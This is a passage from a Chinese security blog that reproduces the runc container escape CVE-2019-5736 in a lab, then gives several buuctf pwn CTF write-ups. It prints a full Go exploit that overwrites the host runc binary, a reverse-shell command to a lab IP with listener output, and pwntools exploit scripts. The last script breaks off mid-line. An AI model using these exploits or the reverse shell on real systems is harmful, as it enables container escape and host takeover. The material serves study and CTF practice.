<li>docker-containerd: 一个与Docker容器有关的守护进程，用于管理容器的创建、运行和销毁等操作。</li>
<li>docker-containerd-ctr: 与docker-containerd交互的命令行程序。</li>
<li>docker-containerd-shim: docker-containerd-ctr和docker-containerd的中间进程，负责通信等工作。</li>
<li><font color=red>dockerd</font>: Docker服务器进程。我们需要知道的是，Docker是以CS架构开发的，平时使用docker命令实质上也都是在和dockerd这个本地的服务器进程进行交互。</li>
<li>docker-init: 轻量级的初始化进程，用于完成容器创建时的初始化操作，并作为容器进程的父进程。</li>
<li>docker-proxy: 网络代理程序，负责容器之间的通信。</li>
<li>docker-runc: 轻量级的容器运行时工具，用于创建和运行容器，负责解析容器的配置并构建隔离环境。</li>
</ul>
<p>也就是说，这个漏洞主要是对这个运行时工具进行攻击。</p>
<h1 id="2-cve-2019-5736介绍"><a class="markdownIt-Anchor" href="#2-cve-2019-5736介绍"></a> 2. CVE-2019-5736介绍</h1>
<p>这个漏洞的PoC可以在<a target="_blank" rel="noopener" href="https://github.com/Frichetten/CVE-2019-5736-PoC">这里</a>找到。</p>
<p>我们来结合这个PoC对这个漏洞的成因与利用方式进行分析。</p>
<figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="comment">// Implementation of CVE-2019-5736</span></span><br><span class="line"><span class="comment">// Created with help from @singe, @_cablethief, and @feexd.</span></span><br><span class="line"><span class="comment">// This commit also helped a ton to understand the vuln</span></span><br><span class="line"><span class="comment">// https://github.com/lxc/lxc/commit/6400238d08cdf1ca20d49bafb85f4e224348bf9d</span></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;io/ioutil&quot;</span></span><br><span class="line">	<span class="string">&quot;os&quot;</span></span><br><span class="line">	<span class="string">&quot;strconv&quot;</span></span><br><span class="line">	<span class="string">&quot;strings&quot;</span></span><br><span class="line">	<span class="string">&quot;flag&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> shellCmd <span class="type">string</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">init</span><span class="params">()</span></span> &#123;</span><br><span class="line">	flag.StringVar(&amp;shellCmd, <span class="string">&quot;shell&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;Execute arbitrary commands&quot;</span>)</span><br><span class="line">	flag.Parse()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">// This is the line of shell commands that will execute on the host</span></span><br><span class="line">	<span class="keyword">var</span> payload = <span class="string">&quot;#!/bin/bash \n&quot;</span> + shellCmd</span><br><span class="line">	<span class="comment">// First we overwrite /bin/sh with the /proc/self/exe interpreter path</span></span><br><span class="line">	fd, err := os.Create(<span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(err)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Fprintln(fd, <span class="string">&quot;#!/proc/self/exe&quot;</span>)</span><br><span class="line">	err = fd.Close()</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(err)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Println(<span class="string">&quot;[+] Overwritten /bin/sh successfully&quot;</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Loop through all processes to find one whose cmdline includes runcinit</span></span><br><span class="line">	<span class="comment">// This will be the process created by runc</span></span><br><span class="line">	<span class="keyword">var</span> found <span class="type">int</span></span><br><span class="line">	<span class="keyword">for</span> found == <span class="number">0</span> &#123;</span><br><span class="line">		pids, err := ioutil.ReadDir(<span class="string">&quot;/proc&quot;</span>)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			fmt.Println(err)</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">for</span> _, f := <span class="keyword">range</span> pids &#123;</span><br><span class="line">			fbytes, _ := ioutil.ReadFile(<span class="string">&quot;/proc/&quot;</span> + f.Name() + <span class="string">&quot;/cmdline&quot;</span>)</span><br><span class="line">			fstring := <span class="type">string</span>(fbytes)</span><br><span class="line">			<span class="keyword">if</span> strings.Contains(fstring, <span class="string">&quot;runc&quot;</span>) &#123;</span><br><span class="line">				fmt.Println(<span class="string">&quot;[+] Found the PID:&quot;</span>, f.Name())</span><br><span class="line">				found, err = strconv.Atoi(f.Name())</span><br><span class="line">				<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">					fmt.Println(err)</span><br><span class="line">					<span class="keyword">return</span></span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// We will use the pid to get a file handle for runc on the host.</span></span><br><span class="line">	<span class="keyword">var</span> handleFd = <span class="number">-1</span></span><br><span class="line">	<span class="keyword">for</span> handleFd == <span class="number">-1</span> &#123;</span><br><span class="line">		<span class="comment">// Note, you do not need to use the O_PATH flag for the exploit to work.</span></span><br><span class="line">		handle, _ := os.OpenFile(<span class="string">&quot;/proc/&quot;</span>+strconv.Itoa(found)+<span class="string">&quot;/exe&quot;</span>, os.O_RDONLY, <span class="number">0777</span>)</span><br><span class="line">		<span class="keyword">if</span> <span class="type">int</span>(handle.Fd()) &gt; <span class="number">0</span> &#123;</span><br><span class="line">			handleFd = <span class="type">int</span>(handle.Fd())</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Println(<span class="string">&quot;[+] Successfully got the file handle&quot;</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Now that we have the file handle, lets write to the runc binary and overwrite it</span></span><br><span class="line">	<span class="comment">// It will maintain it&#x27;s executable flag</span></span><br><span class="line">	<span class="keyword">for</span> &#123;</span><br><span class="line">		writeHandle, _ := os.OpenFile(<span class="string">&quot;/proc/self/fd/&quot;</span>+strconv.Itoa(handleFd), os.O_WRONLY|os.O_TRUNC, <span class="number">0700</span>)</span><br><span class="line">		<span class="keyword">if</span> <span class="type">int</span>(writeHandle.Fd()) &gt; <span class="number">0</span> &#123;</span><br><span class="line">			fmt.Println(<span class="string">&quot;[+] Successfully got write handle&quot;</span>, writeHandle)</span><br><span class="line">			fmt.Println(<span class="string">&quot;[+] The command executed is&quot;</span> + payload)</span><br><span class="line">			writeHandle.Write([]<span class="type">byte</span>(payload))</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="a-覆盖binsh"><a class="markdownIt-Anchor" href="#a-覆盖binsh"></a> A. 覆盖/bin/sh</h2>
<p>在PoC中可以看到，<code>fmt.Fprintln</code>将/bin/sh这个<strong>二进制</strong>文件的前面几个字节修改成了<code>#!/proc/self/exe\n</code>，什么意思呢？这相当于迷惑了Linux系统，将它视作一个Linux Shell文件而不是ELF二进制可执行文件。通过这种覆盖，/bin/sh仍然可以执行，但实际上它完成的将不再是/bin/sh原本的功能，而是跑去执行<code>/proc/self/exe</code>这个文件。</p>
<p>那么<code>/proc/self/exe</code>这个文件又是什么？为什么要执行这个文件呢？在文章开头的资料中给出了答案。</p>
<h2 id="b-找到docker-runc进程"><a class="markdownIt-Anchor" href="#b-找到docker-runc进程"></a> B. 找到docker-runc进程</h2>
<p>在<code>/proc</code>目录中，有很多以数字命名的目录，每一个数字都代表当前一个进程的进程号，而目录中则提供了与这个进程有关的文件，其中就有exe文件。这个文件是一个<strong>符号链接</strong>，指向创建这个进程的可执行文件或这个进程加载的动态链接库。</p>
<p>好，现在我们已经知道进程的可执行文件本身能够在/proc中找到，那么这和本文要讲的CVE有什么关系呢？这就需要了解一下docker-runc的工作原理了。在启动一个容器时，docker-runc会首先构建文件系统等配置，然后fork一次，在子进程调用容器的启动文件完成启动。这样做的结果是，docker-runc这个进程本身也能在容器的进程列表中找到。既然docker-runc在容器中也拥有一个进程号，我们就能够通过遍历所有进程找到它。</p>
<p>具体的遍历方法是：遍历所有进程的cmdline文件并查找runc字符串。cmdline文件顾名思义，保存了进程的命令行参数。如果docker-runc程序位于进程表中，runc一定能够在命令行参数中找到。</p>
<h2 id="c-尝试以只读方式打开runc文件"><a class="markdownIt-Anchor" href="#c-尝试以只读方式打开runc文件"></a> C. 尝试以只读方式打开runc文件</h2>
<p>找到了我们要的进程号之后，我们就可以打开对应的exe文件了。但需要注意的是，这个文件本身是只读的，我们不能直接以读写模式打开，因此这里利用了一个/proc文件的特性。<strong>打开/proc目录下的文件时，不受mnt命名空间的影响，在进行权限检查后就能直接获得文件描述符。</strong></p>
<p>对于一个普通路径下的文件，当进程打开这个文件时，mnt命名空间会对路径进行解析，并生成文件系统视图，确定进程是否能够打开这个文件。但是对于/proc目录则不受mnt命名空间的影响，这使得以其他权限打开文件描述符成为可能，也即——绕过了mnt命名空间的约束。经过与老师的讨论，我不将这个特性视为Linux系统的漏洞。</p>
<p>需要注意的是，打开这个文件本身需要在容器中具有root权限，如果没有，则可能还需要完成提权。</p>
<h2 id="d-以读写方式打开文件描述符"><a class="markdownIt-Anchor" href="#d-以读写方式打开文件描述符"></a> D. 以读写方式打开文件描述符</h2>
<p>以只读方式打开exe文件后，可通过以读写方式打开文件描述符的方式绕过权限限制，打开exe文件，实际上就是docker-runc文件。考虑到Linux系统中不允许修改正在执行的程序文件，因此这里需要多次尝试，在docker-runc停止工作时以抢占的方式打开这个文件。</p>
<h2 id="e-篡改主机的docker-runc文件注入payload"><a class="markdownIt-Anchor" href="#e-篡改主机的docker-runc文件注入payload"></a> E. 篡改主机的docker-runc文件，注入payload</h2>
<p>当docker-runc文件可写后，我们就可以向其中写入任意代码并执行。</p>
<h1 id="3-cve-2019-5736复现"><a class="markdownIt-Anchor" href="#3-cve-2019-5736复现"></a> 3. CVE-2019-5736复现</h1>
<h2 id="a-准备工作"><a class="markdownIt-Anchor" href="#a-准备工作"></a> A. 准备工作</h2>
<p>为了复现这个漏洞，我们需要下载18.09.2以下版本的docker。这里推荐一个仓库，可以很方便地安装用于漏洞复现的docker环境：<a target="_blank" rel="noopener" href="https://github.com/Metarget/metarget">链接</a>。下面是下载版本：</p>
<ul>
<li>docker: 18.03.1-ce</li>
<li>镜像：Ubuntu 16.04（这个需要注意，由于我们使用的docker版本比较低，如果下载18.04及以上的Ubuntu会报错：Error response from daemon: missing signature key，只能下载更低版本的Ubuntu。）</li>
<li>容器创建：docker run -it ubuntu:16.04 /bin/bash</li>
</ul>
<h2 id="b-编译文件"><a class="markdownIt-Anchor" href="#b-编译文件"></a> B. 编译文件</h2>
<p>最新版本的PoC中将要执行的命令移动到了命令行参数中，方便我们灵活地执行任意代码。PoC仓库：<a target="_blank" rel="noopener" href="https://github.com/Frichetten/CVE-2019-5736-PoC">链接</a></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">go build main.go</span><br></pre></td></tr></table></figure>
<p>之后将编译好的PoC复制到docker容器。</p>
<h2 id="c-触发漏洞"><a class="markdownIt-Anchor" href="#c-触发漏洞"></a> C. 触发漏洞</h2>
<p>笔者初学容器逃逸，按照网上的方法尝试了很多次，才终于找到漏洞触发的方法。最后发现是网上的方法说的不详细。</p>
<h3 id="step-1"><a class="markdownIt-Anchor" href="#step-1"></a> Step 1</h3>
<p>在另一台虚拟机（192.168.198.135）中打开50000端口的监听，设置PoC的任意执行命令为反弹shell命令：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.198.135/50000 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
<h3 id="step-2"><a class="markdownIt-Anchor" href="#step-2"></a> Step 2</h3>
<p>用bash作为命令行打开容器：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="built_in">exec</span> -it &lt;容器名&gt; bash</span><br></pre></td></tr></table></figure>
<h3 id="step-3"><a class="markdownIt-Anchor" href="#step-3"></a> Step 3</h3>
<p>apt update，安装netcat。</p>
<p>复制PoC二进制ELF执行PoC代码，立即可以看到/bin/sh被覆盖的提示信息，但是一直找不到runc进程，这是因为目前docker还没有需要runc参与的任务。</p>
<h3 id="step-4"><a class="markdownIt-Anchor" href="#step-4"></a> Step 4</h3>
<p>在主机另一个终端打开容器的命令行让PoC检测到runc。但这次一定要用/bin/sh打开命令行而不是bash。docker exec命令执行后瞬间就可以看到runc进程被修改的提示信息。在新的终端中用sh无法打开容器的命令行，显示<code>No help topic for '/bin/sh'</code>。</p>
<h3 id="step-5"><a class="markdownIt-Anchor" href="#step-5"></a> Step 5</h3>
<p>在新的终端再一次尝试用sh打开容器的命令行，随后命令行阻塞，成功执行反弹shell代码，下面是攻击者机器的部分命令行显示内容：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">root@colin-virtual-machine:~/Desktop<span class="comment"># nc -vv -lp 50000</span></span><br><span class="line">Listening on 0.0.0.0 50000</span><br><span class="line">Connection received on 192.168.198.xxx 42248</span><br><span class="line">bash: cannot <span class="built_in">set</span> terminal process group (8750): Inappropriate ioctl <span class="keyword">for</span> device</span><br><span class="line">bash: no job control <span class="keyword">in</span> this shell</span><br><span class="line">&lt;ebe2896995719366ddc8dd1893c0081bff30f6c5cf7d3c339<span class="comment"># ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">16505d598214f0c33ba21d8e96f5ecf34db215d32ba229527a67314d7ed96c7a.pid</span><br><span class="line">config.json</span><br><span class="line">init.pid</span><br><span class="line">log.json</span><br><span class="line">rootfs</span><br><span class="line">&lt;ebe2896995719366ddc8dd1893c0081bff30f6c5cf7d3c339<span class="comment"># uname -a</span></span><br><span class="line"><span class="built_in">uname</span> -a</span><br><span class="line">Linux ubuntu 5.4.0-150-generic <span class="comment">#167~18.04.1-Ubuntu SMP Wed May 24 00:51:42 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux</span></span><br><span class="line">&lt;ebe2896995719366ddc8dd1893c0081bff30f6c5cf7d3c339<span class="comment"># pwd</span></span><br><span class="line"><span class="built_in">pwd</span></span><br><span class="line">/run/docker/containerd/daemon/io.containerd.runtime.v1.linux/moby/cf90012c3bea6ddebe2896995719366ddc8dd1893c0081bff30f6c5cf7d3c339</span><br><span class="line">&lt;ebe2896995719366ddc8dd1893c0081bff30f6c5cf7d3c339<span class="comment"># </span></span><br></pre></td></tr></table></figure>
<p>复现完毕。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/03/25/buuctf-pwn-write-ups-13/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's BLOG">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/03/25/buuctf-pwn-write-ups-13/" class="post-title-link" itemprop="url">buuctf-pwn write-ups (13)</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2023-03-25 17:14:12" itemprop="dateCreated datePublished" datetime="2023-03-25T17:14:12+08:00">2023-03-25</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2024-01-31 17:21:03" itemprop="dateModified" datetime="2024-01-31T17:21:03+08:00">2024-01-31</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/write-ups/" itemprop="url" rel="index"><span itemprop="name">write-ups</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/write-ups/buuctf-%E7%B3%BB%E5%88%97/" itemprop="url" rel="index"><span itemprop="name">buuctf 系列</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>14k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>13 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="buu102-starctf_2019_babyshell"><a class="markdownIt-Anchor" href="#buu102-starctf_2019_babyshell"></a> buu102-starctf_2019_babyshell</h1>
<p>这道题虽然说有一个check函数检查输入的shellcode是否全部都是白名单里面的字符，但实际上我们可以通过开头1个字符为\x00的指令来绕过这个检查，然后写入任意字符。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process([&#x27;./pwn&#x27;])</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">25580</span>)</span><br><span class="line"></span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	sa(<span class="string">b&#x27;give me shellcode, plz:\n&#x27;</span>, <span class="string">b&#x27;\x00\x2f&#x27;</span> + asm(shellcraft.amd64.sh()))</span><br><span class="line">	io.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="buu103-actf_2019_babyheap"><a class="markdownIt-Anchor" href="#buu103-actf_2019_babyheap"></a> buu103-actf_2019_babyheap</h1>
<p>一道简单的堆排布问题，错开分配到控制chunk，改函数指针，/bin/sh在程序中已经有了。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">26355</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x)</span><br><span class="line">rud = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">ita = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, content</span>):</span><br><span class="line">	sla(<span class="string">b&#x27;Your choice: &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">	sla(<span class="string">b&#x27;Please input size: &#x27;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line">	sa(<span class="string">b&#x27;Please input content: &#x27;</span>, content)</span><br><span class="line">	</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">	sla(<span class="string">b&#x27;Your choice: &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">	sla(<span class="string">b&#x27;Please input list index: &#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">	</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">	sla(<span class="string">b&#x27;Your choice: &#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">	sla(<span class="string">b&#x27;Please input list index: &#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">	</span><br><span class="line">binsh = <span class="number">0x602010</span></span><br><span class="line">	</span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">b&#x27;a\n&#x27;</span>)</span><br><span class="line">add(<span class="number">0x10</span>, <span class="string">b&#x27;a\n&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x30</span>, <span class="string">b&#x27;a\n&#x27;</span>)</span><br><span class="line">add(<span class="number">0x10</span>, p64(binsh) + p64(elf.plt[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">ita()</span><br></pre></td></tr></table></figure>
<h1 id="buu193-starctf2018_babystack"><a class="markdownIt-Anchor" href="#buu193-starctf2018_babystack"></a> buu193-starctf2018_babystack</h1>
<p>这道题有一个<code>pthread_create</code>函数创建了一个新的线程，在这个线程中有一个很大的栈溢出。这里我们需要通过对程序内存空间的分析理解本题的利用思路。<br />
本题创建的线程的栈正好位于TLS结构体下面，TLS结构体位于libc加载基地址的前一页。记得TLS在house of emma中提到过，其中包含了canary的值，而本题中正好有canary，因此要溢出就必须溢出到覆盖canary的值。幸运的是，本题是可以实现的。<br />
我们可以通过ret2csu调用read函数写入一个one gadget到bss段中某处，然后通过调用puts函数获取到libc的基地址，最后进行栈迁移将rsp修改为写one gadget的地址，最后调用one gagdet。这里进行栈迁移的主要目的是确保栈空间的完全纯净，因为几乎所有的one gadget都要求栈中某个地方的值为0。另外此题不能通过调用<code>system</code>函数的方式getshell，因为此时我们已经覆盖了TLS结构体，无法成功调用system函数，而one gadget通常都是使用syscall指令来get shell的，因此没有影响。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">25587</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">poprdi = <span class="number">0x400c03</span></span><br><span class="line">poprsi_r15 = <span class="number">0x400c01</span></span><br><span class="line">leave_ret = <span class="number">0x400A9B</span></span><br><span class="line">poprbp = <span class="number">0x400870</span></span><br><span class="line">gad = <span class="number">0x400BFA</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;How many bytes do you want to send?&#x27;</span>, <span class="built_in">str</span>(<span class="number">0x2000</span>).encode())</span><br><span class="line">payload = cyclic(<span class="number">0x28</span>) + p64(<span class="number">0</span>) + cyclic(<span class="number">4104</span> - <span class="number">0x30</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)	<span class="comment"># canary</span></span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(poprdi)</span><br><span class="line">payload += p64(elf.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p64(gad)</span><br><span class="line">payload += p64(<span class="number">0</span>)	<span class="comment"># pop rbx</span></span><br><span class="line">payload += p64(<span class="number">1</span>)	<span class="comment"># pop rbp</span></span><br><span class="line">payload += p64(elf.got[<span class="string">&#x27;read&#x27;</span>])	<span class="comment"># pop r12</span></span><br><span class="line">payload += p64(<span class="number">0x100</span>)	<span class="comment"># pop r13</span></span><br><span class="line">payload += p64(elf.bss() + <span class="number">0x400</span>)	<span class="comment"># pop r14</span></span><br><span class="line">payload += p64(<span class="number">0</span>)	<span class="comment"># pop r15</span></span><br><span class="line">payload += p64(<span class="number">0x400BE0</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>) * <span class="number">7</span></span><br><span class="line">payload += p64(poprbp)</span><br><span class="line">payload += p64(elf.bss() + <span class="number">0x400</span>)</span><br><span class="line">payload += p64(leave_ret)</span><br><span class="line">payload = payload.ljust(<span 